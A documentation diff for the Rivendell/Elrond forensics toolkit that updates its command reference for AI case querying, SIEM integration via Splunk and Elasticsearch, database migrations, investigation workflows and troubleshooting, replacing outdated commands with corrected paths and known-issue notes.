+| `index` | `CASE_ID OUTPUT_DIR [--timeline CSV] [--iocs CSV] [--processes CSV] [--network CSV] [--registry CSV] [--files CSV] [--cloud-logs JSON --cloud-provider P]` | Index a case |
+| `query` | `CASE_ID "QUESTION" [--temperature T] [--max-tokens N] [--no-sources] [-o FILE] [-v]` | Ask a question |
+| `suggest` | `CASE_ID [-o FILE]` | Suggest investigation paths |
+| `summary` | `CASE_ID [--format text\|json\|markdown] [-o FILE]` | Case summary |
+| `search` | `CASE_ID "QUERY" [--top-k N]` | Similarity search without the LLM |
+| `info` | `CASE_ID` | Show what is indexed |
 
-### Query Case
-
-Ask natural language questions:
+All commands accept `--llm-type ollama|llamacpp`, `--model-name` (default `llama3`) and, except `index`, `--base-dir` and `--model-path` (llama.cpp). `index` also takes `--device cpu|cuda` for embeddings. Indexes are read from `--base-dir`, default `$RIVENDELL_DATA_DIR` or `/opt/rivendell/data`.
 
 ```bash
-# Simple query
-rivendell-ai query CASE-001 "What PowerShell commands were executed?"
-
-# Complex query
-rivendell-ai query CASE-001 "Show network connections to external IPs between 14:00 and 15:00"
-
-# Multiple queries
-rivendell-ai query CASE-001 "What MITRE techniques were detected?" \
-  "Show lateral movement evidence" \
-  "List persistence mechanisms"
-
-# Save results
-rivendell-ai query CASE-001 "What malware was detected?" -o results.txt
+python3 -m src.analysis.rivendell.ai.cli index CASE-001 /output/CASE-001
+python3 -m src.analysis.rivendell.ai.cli query CASE-001 "What PowerShell commands were executed?"
+python3 -m src.analysis.rivendell.ai.cli summary CASE-001 --format markdown -o summary.md
 ```
-
----
-
-### Get Investigation Suggestions
-
-Get AI-generated investigation suggestions:
-
-```bash
-# Get suggestions
-rivendell-ai suggest CASE-001
-
-# Detailed suggestions
-rivendell-ai suggest CASE-001 --detailed
-
-# Focus area
-rivendell-ai suggest CASE-001 --focus "lateral movement"
-```
-
----
-
-### Generate Summary
-
-Create investigation summaries:
-
-```bash
-# Markdown summary
-rivendell-ai summary CASE-001 --format markdown --output summary.md
-
-# HTML report
-rivendell-ai summary CASE-001 --format html --output report.html
-
-# JSON export
-rivendell-ai summary CASE-001 --format json --output report.json
-
-# Email-friendly text
-rivendell-ai summary CASE-001 --format text --output summary.txt
-```
-
----
 
 ### Web Interface
 
-Start web chat interface:
-
 ```bash
-# Start server
-python3 -m rivendell.ai.web_interface
-
-# Custom port
-python3 -m rivendell.ai.web_interface --port 8080
-
-# Access at http://localhost:5687/ai/chat/CASE-001
+python3 -m src.analysis.rivendell.ai.web_interface
 ```
 
----
-
-### Case Management
-
-```bash
-# List indexed cases
-rivendell-ai list
-
-# Show case info
-rivendell-ai info CASE-001
-
-# Delete case index
-rivendell-ai delete CASE-001
-
-# Export case data
-rivendell-ai export CASE-001 -o case_export.json
-```
+It serves the chat UI at `http://localhost:5687/ai/chat/<case>` and JSON endpoints under `/ai/cases/`. Port 5687 is fixed (no option) and is also the frontend container's host port, so stop the frontend first or call `start_server(port=…)` from Python. Settings come from `RIVENDELL_DATA_DIR`, `RIVENDELL_LLM_TYPE` and `RIVENDELL_MODEL_NAME`.
 
 ---
 
 ## SIEM Integration
 
-### Splunk Export
-
-Export data to Splunk via HTTP Event Collector (HEC):
+There is no standalone SIEM exporter. Splunk and Elastic indexing runs inside Elrond:
 
 ```bash
-# Export case
-python3 -m rivendell.siem.splunk_exporter \
-  --case-id CASE-001 \
-  --data-dir /output/CASE-001 \
-  --hec-url https://splunk.company.com:8088 \
-  --hec-token YOUR_HEC_TOKEN
-
-# Specific source type
-python3 -m rivendell.siem.splunk_exporter \
-  --case-id CASE-001 \
-  --data-dir /output/CASE-001 \
-  --hec-url https://splunk:8088 \
-  --hec-token YOUR_TOKEN \
-  --source-type rivendell:forensics
-
-# Test connection
-python3 -m rivendell.siem.splunk_test \
-  --hec-url https://splunk:8088 \
-  --hec-token YOUR_TOKEN
+python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process --Analysis --Splunk --Elastic --Navigator
 ```
 
----
+or for a completed web job with `POST /api/jobs/{job_id}/export-siem`. Start the services first with `docker compose --profile siem up -d`; Elrond fails fast if a requested SIEM is unreachable.
 
-### Elasticsearch Export
+| Variable | Used for |
+|---|---|
+| `SPLUNK_HOST`, `SPLUNK_PORT`, `SPLUNK_USERNAME`, `SPLUNK_PASSWORD` | Splunk management API (default port 8089) |
+| `ELASTICSEARCH_HOST`, `ELASTICSEARCH_PORT`, `ELASTIC_USERNAME`, `ELASTIC_PASSWORD` | Elasticsearch |
+| `KIBANA_HOST`, `KIBANA_PORT` | Kibana dashboards |
 
-Export data to Elasticsearch:
-
-```bash
-# Export case
-python3 -m rivendell.siem.elastic_exporter \
-  --case-id CASE-001 \
-  --data-dir /output/CASE-001 \
-  --elastic-url https://elastic:9200 \
-  --index rivendell-case-001
-
-# With authentication
-python3 -m rivendell.siem.elastic_exporter \
-  --case-id CASE-001 \
-  --data-dir /output/CASE-001 \
-  --elastic-url https://elastic:9200 \
-  --username elastic \
-  --password YOUR_PASSWORD \
-  --index rivendell-case-001
-
-# Test connection
-python3 -m rivendell.siem.elastic_test \
-  --elastic-url https://elastic:9200 \
-  --username elastic \
-  --password YOUR_PASSWORD
-```
+In Docker the worker gets `SPLUNK_HOST`, `SPLUNK_PASSWORD` and `ELASTICSEARCH_HOST` from `docker-compose.yml`. Splunk ingests through file monitors on a fixed `/tmp` path, so case output written elsewhere (an external drive, for example) is indexed in Elastic but not Splunk (known issue).
 
 ---
 
 ## Utility Commands
 
-### Check Dependencies
+### Dependencies and Installation
 
-Verify installed forensic tools:
+`src/analysis/cli.py` (the `rivendell-analyze` entry point in `pyproject.toml`) is meant to provide `--check-dependencies`, `--install` and `--version`, but it imports the old `elrond.*` package and fails with `ModuleNotFoundError: No module named 'elrond'`. Until that is fixed, use the Docker worker image, which has every tool installed, or [CONFIG.md](CONFIG.md) for manual installation.
+
+### Database
+
+The web backend's Postgres schema is managed with Alembic (`src/web/backend/alembic/`):
 
 ```bash
-# Check all dependencies
-elrond --check-dependencies
-
-# Show versions
-elrond --check-dependencies --verbose
-
-# Check specific tools
-python3 -m rivendell.utils.check_tools volatility plaso sleuthkit
+docker exec rivendell-backend alembic upgrade head
 ```
 
----
+### Logs
 
-### Version Information
-
-```bash
-# Show version
-elrond --version
-
-# Detailed version info
-python3 -m rivendell.utils.version --detailed
-
-# Check for updates
-python3 -m rivendell.utils.version --check-updates
-```
-
----
-
-### Logging
+Each case writes `rivendell_audit.log` (CSV, UTC timestamps) to its output directory. In Docker:
 
 ```bash
-# View logs
-tail -f /var/log/rivendell/elrond.log
-
-# Search logs
-grep ERROR /var/log/rivendell/elrond.log
-
-# Clear logs
-python3 -m rivendell.utils.clear_logs
-```
-
----
-
-### Database Management
-
-```bash
-# Initialize database
-python3 -m rivendell.db.init
-
-# Run migrations
-python3 -m rivendell.db.migrate
-
-# Backup database
-python3 -m rivendell.db.backup -o /backups/rivendell-$(date +%Y%m%d).sql
-
-# Restore database
-python3 -m rivendell.db.restore /backups/rivendell-20250115.sql
+docker logs rivendell-celery-worker --tail 100   # Elrond and task output
+docker logs rivendell-backend --tail 100          # API
 ```
 
 ---
 
 ## Configuration
 
-### Environment Variables
-
-```bash
-# Set Rivendell base directory
-export RIVENDELL_HOME=/opt/rivendell
-
-# Set output directory
-export RIVENDELL_OUTPUT=/cases
-
-# Set log level
-export RIVENDELL_LOG_LEVEL=DEBUG
-
-# Enable debug mode
-export RIVENDELL_DEBUG=1
-
-# SIEM configuration
-export SPLUNK_HEC_URL=https://splunk:8088
-export SPLUNK_HEC_TOKEN=your_token_here
-export ELASTIC_URL=https://elastic:9200
-export ELASTIC_USERNAME=elastic
-export ELASTIC_PASSWORD=your_password
-```
-
----
-
-### Configuration Files
-
-**Main Config:** `/etc/rivendell/config.yml`
-
-```yaml
-general:
-  log_level: INFO
-  output_dir: /cases
-  temp_dir: /tmp/rivendell
-
-analysis:
-  parallel_processing: true
-  max_workers: 4
-  memory_limit_gb: 16
-
-mitre:
-  auto_update: true
-  update_interval_days: 7
-
-siem:
-  splunk:
-    enabled: true
-    hec_url: https://splunk:8088
-    hec_token: YOUR_TOKEN
-  elastic:
-    enabled: true
-    url: https://elastic:9200
-    username: elastic
-    password: YOUR_PASSWORD
-```
+Elrond is configured by its command-line options; there is no config file. The Docker stack is configured in `docker-compose.yml` and the variables in the SIEM and AI sections above. See [CONFIG.md](CONFIG.md) for tool installation and paths.
 
 ---
 
 ## Common Workflows
 
-### 1. Complete Investigation
+### Acquire and Analyse a Live Host
 
 ```bash
-# Step 1: Acquire evidence
-python3 acquisition/python/gandalf.py Password 192.168.1.100 \
-  -u admin -M -o /evidence/CASE-001
-
-# Step 2: Analyze evidence
-elrond -C -P -A -M -T -B CASE-001 \
-  /evidence/CASE-001/*.tar.gz \
-  /output/CASE-001 \
-  -m /evidence/CASE-001/memory.dmp
-
-# Step 3: Map to MITRE
-python3 -m rivendell.mitre.mapper /output/CASE-001
-
-# Step 4: Index for AI
-rivendell-ai index CASE-001 /output/CASE-001
-
-# Step 5: Query investigation
-rivendell-ai query CASE-001 "What was the initial access vector?"
-
-# Step 6: Export to SIEM
-python3 -m rivendell.siem.splunk_exporter \
-  --case-id CASE-001 \
-  --data-dir /output/CASE-001 \
-  --hec-url https://splunk:8088 \
-  --hec-token YOUR_TOKEN
-
-# Step 7: Generate report
-rivendell-ai summary CASE-001 --format markdown -o report.md
+cd src/acquisition && sudo python3 python/gandalf.py Key Local -M -O /evidence/CASE-001 && cd -
+python3 src/analysis/elrond.py CASE-001 /evidence/CASE-001 /output/CASE-001 --Gandalf --Process --Analysis --Memory
+python3 -m src.analysis.rivendell.ai.cli index CASE-001 /output/CASE-001
+python3 -m src.analysis.rivendell.ai.cli query CASE-001 "What was the initial access vector?"
 ```
 
----
-
-### 2. Quick Triage
+### Triage a Disk Image
 
 ```bash
-# Fast analysis for initial triage
-python3 acquisition/python/gandalf.py None Local -o /evidence/TRIAGE-001
-elrond -C -P -A -q TRIAGE-001 /evidence/TRIAGE-001 /output/TRIAGE-001
-rivendell-ai query TRIAGE-001 "What IOCs were detected?"
+python3 src/analysis/elrond.py TRIAGE-001 /evidence/TRIAGE-001 /output/TRIAGE-001 --Collect --Process --Analysis
 ```
 
----
+Add `--extractIocs` only if you can wait: it added 43 minutes on a 12 GB Windows E01 and 71 on a 21 GB Linux image ([PERFORMANCE.md](PERFORMANCE.md)).
 
-### 3. Cloud Investigation
+### Cloud Logs
 
 ```bash
-# Acquire cloud logs
-python3 -m rivendell.cloud.cli aws acquire-logs --days 7 --output ./logs/AWS-001
-
-# Analyze cloud activity
-python3 -m rivendell.cloud.cli aws analyze-logs \
-  --log-file ./logs/AWS-001/cloudtrail.json \
-  --detect-suspicious
-
-# Query findings
-rivendell-ai index AWS-001 ./logs/AWS-001
-rivendell-ai query AWS-001 "What suspicious AWS API calls were made?"
+python3 -m src.analysis.rivendell.cloud.cli aws acquire-logs --days 7 -o ./logs/AWS-001 --analyze
+python3 -m src.analysis.rivendell.ai.cli index AWS-001 ./logs/AWS-001 --cloud-logs ./logs/AWS-001/cloudtrail.json --cloud-provider aws
 ```
 
----
+### Several Images
 
-### 4. Batch Processing
+Elrond processes every image it finds in `SOURCE_DIR` as one case. For separate cases, give each image its own directory and run them one after another, not in parallel: concurrent runs share `/mnt/elrond_mountNN` and unmount each other's images.
 
 ```bash
-# Process multiple evidence files
-for evidence in /evidence/*.tar.gz; do
-  caseid=$(basename "$evidence" .tar.gz)
-  elrond -C -P -A -B "$caseid" "$evidence" "/output/$caseid" &
-done
-wait
-
-# Index all cases
-for case in /output/*; do
-  caseid=$(basename "$case")
-  rivendell-ai index "$caseid" "$case"
+for dir in /evidence/*/; do
+  case_id=$(basename "$dir")
+  python3 src/analysis/elrond.py "$case_id" "$dir" "/output/$case_id" --Collect --Process --Analysis
 done
 ```
 
@@ -1118,77 +485,36 @@ done
 
 ## Troubleshooting
 
-### Common Issues
+**`unrecognized arguments` from a `-m` module.** You ran it from inside `src/analysis`. Run it from the repository root (see the top of this page).
 
-**Tool not found errors:**
-```bash
-# Check what's missing
-elrond --check-dependencies
+**A Linux image finishes in seconds with no output.** Loop devices leaked from an earlier run. Check `losetup -a` and release them with `kpartx -d` and `losetup -d` when nothing else is mounted.
 
-# Install missing tools (Ubuntu/Debian)
-sudo apt-get install volatility3 plaso-tools sleuthkit
+**A job seems stalled.** Several steps log nothing for 30 minutes or more: foremost, Plaso, end-of-collection clean-up and the result statistics. Check the processes before cancelling; see [TEST_RUNNER_GUIDE.md](../tests/docs/TEST_RUNNER_GUIDE.md#long-silent-stretches).
 
-# Install via pip
-pip3 install volatility3
-```
+**Mount permission errors.** Image mounting needs root or the privileged worker container.
 
-**Memory analysis failures:**
-```bash
-# Check dump file
-file /path/to/memory.dmp
-
-# Try different profile
-vol3 -f /path/to/memory.dmp windows.info
-
-# Use auto-detect
-elrond -C -P -A -M CASE-001 /evidence /output -m /memory.dmp
-```
-
-**Permission errors:**
-```bash
-# Ensure proper permissions
-sudo chown -R $USER:$USER /output
-sudo chmod -R 755 /output
-
-# Run with elevated privileges (for mounting)
-sudo elrond -C CASE-001 /evidence/disk.E01 /output
-```
-
-**AI agent issues:**
-```bash
-# Check Ollama
-curl http://localhost:11434/api/tags
-
-# Restart Ollama
-ollama serve
-
-# Rebuild index
-rivendell-ai index CASE-001 /output/CASE-001 --reindex
-```
+**AI agent cannot reach the model.** Check Ollama with `ollama list`, then start it with `ollama serve`.
 
 ---
 
 ## Getting Help
 
-**Built-in Help:**
 ```bash
-elrond --help
-gandalf.py --help
-rivendell-ai --help
+python3 src/analysis/elrond.py --help
+python3 src/acquisition/python/gandalf.py --help
+python3 -m src.analysis.rivendell.ai.cli --help
+python3 -m src.analysis.rivendell.cloud.cli --help
+python3 -m src.analysis.mitre.cli --help
 ```
 
-**Documentation:**
 - [API Reference](API.md)
-- [User Guide](USER_GUIDE.md)
+- [Usage Guide](USAGE.md)
 - [Quick Start](QUICKSTART.md)
-- [Security Guide](SECURITY.md)
-
-**Community:**
+- [Security](SECURITY.md)
 - GitHub Issues: https://github.com/cmdaltr/rivendell/issues
-- Discussions: https://github.com/cmdaltr/rivendell/discussions
 
 ---
 
 **Version:** 2.1.0
-**Last Updated:** 2025-01-15
+**Last Updated:** 2026-10-22
 **License:** See LICENSE file
